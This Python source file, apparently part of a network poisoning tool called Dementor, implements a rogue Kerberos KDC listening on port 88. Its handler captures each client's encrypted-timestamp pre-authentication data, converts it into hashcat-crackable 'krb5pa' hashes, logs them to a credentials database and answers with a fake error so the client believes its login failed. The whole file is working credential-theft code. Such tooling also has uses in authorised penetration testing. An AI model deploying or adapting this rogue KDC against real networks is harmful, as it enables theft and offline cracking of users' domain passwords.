# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import struct

from datetime import datetime, UTC
from typing import List

from impacket.krb5.asn1 import (
    AS_REQ,
    ETYPE_INFO2,
    KRB_ERROR,
    METHOD_DATA,
    PA_DATA,
    ETYPE_INFO2_ENTRY,
    EncryptedData,
)
from impacket.krb5.constants import (
    ApplicationTagNumbers,
    ErrorCodes,
    PrincipalNameType,
    PreAuthenticationDataTypes,
    EncryptionTypes,
)
from impacket.krb5.types import KerberosTime
from pyasn1.codec.der import decoder, encoder

from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.util import get_value
from dementor.servers import (
    ThreadingTCPServer,
    ThreadingUDPServer,
    BaseProtoHandler,
    ServerThread,
)
from dementor.logger import ProtocolLogger


class KerberosConfig(TomlConfig):
    _section_ = "Kerberos"
    _fields_ = [
        A("krb5_salt", "Salt", ""),
        A("krb5_etype", "EncType", EncryptionTypes.rc4_hmac),
        A("krb5_error_code", "ErrorCode", ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN),
    ]

    def set_krb5_salt(self, value):
        if isinstance(value, bytes):
            self.krb5_salt = value
        else:
            self.krb5_salt = str(value).encode("utf-8", errors="replace")

    def set_krb5_etype(self, value):
        match value:
            case int():
                self.krb5_etype = value
            case EncryptionTypes():
                self.krb5_etype = value.value
            case _:
                self.krb5_etype = EncryptionTypes[value].value

    def set_krb5_error_code(self, value):
        match value:
            case int():
                self.krb5_error_code = value
            case ErrorCodes():
                self.krb5_error_code = value.value
            case _:
                self.krb5_error_code = ErrorCodes[value].value


def apply_config(session):
    session.krb5_config = KerberosConfig(get_value("Kerberos", key=None, default={}))


def create_server_threads(session) -> list:
    return (
        [
            ServerThread(session, KDCUDP),
            ServerThread(session, KDCTCP),
        ]
        if session.kdc_enabled
        else []
    )


def KRB5_Err(
    error_code: int,
    realm: str | None = None,
    sname: List[str] | None = None,
    sname_type: int | None = None,
    etype: int | None = None,
    salt: bytes | None = None,
) -> KRB_ERROR:
    krb_error = KRB_ERROR()
    # message props
    krb_error["pvno"] = 5
    krb_error["msg-type"] = ApplicationTagNumbers.KRB_ERROR.value

    krb_error["error-code"] = error_code
    krb_error["stime"] = KerberosTime.to_asn1(datetime.now(UTC))
    krb_error["susec"] = 0
    if realm is not None:
        krb_error["realm"] = realm

    # Principal is set to krbtgt
    sname_type = sname_type or PrincipalNameType.NT_PRINCIPAL.value
    krb_error["sname"]["name-type"] = sname_type
    for sname_entry in sname or []:
        krb_error["sname"]["name-string"].append(sname_entry)

    if etype is not None and salt is not None:
        methods = METHOD_DATA()

        padata_entry = ETYPE_INFO2_ENTRY()
        padata_entry["etype"] = etype
        padata_entry["salt"] = salt

        etype_info2 = ETYPE_INFO2()
        etype_info2.append(padata_entry)

        padata = PA_DATA()
        padata["padata-type"] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value
        padata["padata-value"] = encoder.encode(etype_info2)

        methods.append(padata)
        krb_error["e-data"] = encoder.encode(methods)

    return krb_error


def KRB5_ASREQ_to_hashcat_format(
    etype: int,
    username: str | bytes,
    realm: str | bytes,
    enc_timestamp: bytes,
    salt: bytes,
) -> tuple:
    if isinstance(username, bytes):
        username = username.decode("utf-8", errors="replace")

    if isinstance(realm, bytes):
        realm = realm.decode("utf-8", errors="replace")

    entries = [
        "$krb5pa",
        str(etype),
        str(username),
        str(realm),
    ]

    ts = enc_timestamp
    match etype:
        case EncryptionTypes.rc4_hmac.value:
            # Format is: $krb5pa$<etype>$<username>$<realm>$<salt>$<enc_timestamp>
            entries.append(salt.hex())
            ts = enc_timestamp[16:] + enc_timestamp[:16]
            name = "Krb5pa-RC4"

        case EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            name = "Krb5pa-AES128"

        case EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            name = "Krb5pa-AES256"

        case _:
            # REVISIT: maybe use name from enum
            name = "Krb5pa-Unknown"

    entries.append(ts.hex())
    return name, "$".join(entries)


class KDCHandler(BaseProtoHandler):
    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "Kerberos",
                "protocol_color": "dark_magenta",
                "host": self.client_host,
                "port": self.server.server_address[1],
            }
        )

    def handle_data(self, data, transport) -> None:
        if data is None:
            # TCP data must be received first
            data = transport.recv(2048)

        if len(data) < 4:
            # erroneous packet
            return

        data_len = struct.unpack(">I", data[:4])[0]
        if data_len > len(data) - 4:
            # packet length is invalid
            return

        # AS_REQ
        # Kerberos authentication service request message (KRB_AS_REQ) ([RFC4120] section 5.4.1): The client
        # sends a request to the KDC for a ticket-granting ticket (TGT) ([RFC4120] section 5.3). The client
        # presents its principal name and can present pre-authentication information.
        as_req, *_ = decoder.decode(data[4:], asn1Spec=AS_REQ())

        salt = self.config.krb5_config.krb5_salt
        if not salt:
            cname = str(as_req["req-body"]["cname"]["name-string"][0])
            realm = str(as_req["req-body"]["realm"])
            # By default, the salt is always
            if cname.endswith("$"):
                # For computers: uppercase FQDN + hardcoded host text + lowercase FQDN
                # hostname without the trailing $
                salt = realm.upper() + "host" + cname[:-1].lower() + realm.lower()
            else:
                # For users: uppercase FQDN + case sensitive username
                salt = realm.upper() + cname

        if isinstance(salt, str):
            salt = salt.encode("utf-8", errors="replace")

        # Pre-Auth data must be present to record the hash
        error_code = ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value
        if as_req["padata"] is not None:
            for pa_data in as_req["padata"]:
                if (
                    # [RFC4120] section 5.2.7.2 Encrypted Timestamp Pre-authentication:
                    # "The ciphertext (padata-value) consists of the PA-ENC-TS-ENC encoding, encrypted
                    # using the client's secret key and a key usage value of 1."
                    pa_data["padata-type"]
                    == PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value
                ):
                    encrypted_data, *_ = decoder.decode(
                        pa_data["padata-value"], asn1Spec=EncryptedData()
                    )

                    # the AS-REQ body contains the user's principal name
                    req_body = as_req["req-body"]
                    user_name = str(req_body["cname"]["name-string"][0])
                    domain = str(req_body["realm"])

                    hashname, hashvalue = KRB5_ASREQ_to_hashcat_format(
                        encrypted_data["etype"],
                        username=user_name,
                        realm=domain,
                        enc_timestamp=encrypted_data["cipher"].asOctets(),
                        salt=salt,
                    )

                    self.config.db.add_auth(
                        client=self.client_address,
                        credtype=hashname,
                        username=user_name,
                        domain=domain,
                        logger=self.logger,
                        password=hashvalue,
                    )
                    # success, now let the client think its authentication failed
                    error_code = self.config.krb5_config.krb5_error_code

        realm = str(as_req["req-body"]["realm"])
        sname = ["krbtgt", realm]
        if error_code != ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            krb_error = KRB5_Err(error_code, realm, sname)
        else:
            # make sure we require pre-authentication
            krb_error = KRB5_Err(
                error_code,
                realm=realm,
                sname=sname,
                etype=self.config.krb5_config.krb5_etype,
                salt=salt,
            )

        # send KRB_ERROR
        data = encoder.encode(krb_error)
        msg_len = struct.pack(">I", len(data))
        transport.send(msg_len + data)


class KDCUDP(ThreadingUDPServer):
    default_handler_class = KDCHandler
    default_port = 88
    service_name = "Kerberos KDC (UDP)"


class KDCTCP(ThreadingTCPServer):
    default_handler_class = KDCHandler
    default_port = 88
    service_name = "Kerberos KDC (TCP)"
